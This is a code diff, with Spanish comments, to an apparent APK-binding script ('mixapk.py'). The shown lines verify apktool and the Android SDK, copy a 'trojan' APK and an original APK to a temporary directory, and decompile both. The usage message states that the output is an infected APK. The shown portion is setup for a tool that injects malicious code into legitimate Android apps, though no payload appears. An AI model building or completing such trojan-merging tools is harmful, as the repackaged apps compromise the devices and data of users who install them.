@@ -209,20 +209,24 @@ def sed(file, old, new):
 if not os.path.exists(TempDirectory):
     os.makedirs(TempDirectory)
 
+#copiar argumentos a args
 args = ParseArgs().getargs()
 
+#verifica la ruta de apktool
 if not os.path.isfile(apktool):
     error("apktool no esta en la ruta: " + apktool, None, 1)
 
+#verifica la ruta de androidSdk
 if not os.path.exists(androidSdk):
     error("android SDK no esta en la ruta: " + androidSdk, None, 1)
 
+#Verifica que se haya un nombre al apk final
 if args.out[0]:
 	out=args.out[0]
 else:
 	error("Especifica un nombre para la apk infectada. Uso : mixapk.py --apks apk1.apk apk2.apk -o apk3.apk", None ,1)
 
-
+#Verifica que las apks (ApkTrojano y ApkOriginal) existan y las copia a directrio temporal
 if args.apks and os.path.isfile(args.apks[0]) and os.path.isfile(args.apks[1]):
     try:
         shutil.copyfile(args.apks[0], apk1)
@@ -234,6 +238,7 @@ else:
 
 
 try:
+	#Llama a apktool para decomplilar las apks
     call(apktool + " d -v -f -o " + apk1Directory + " " + apk1, shell=True)
     call(apktool + " d -v -f -o " + apk2Directory + " " + apk2, shell=True)
 except OSError as ex:
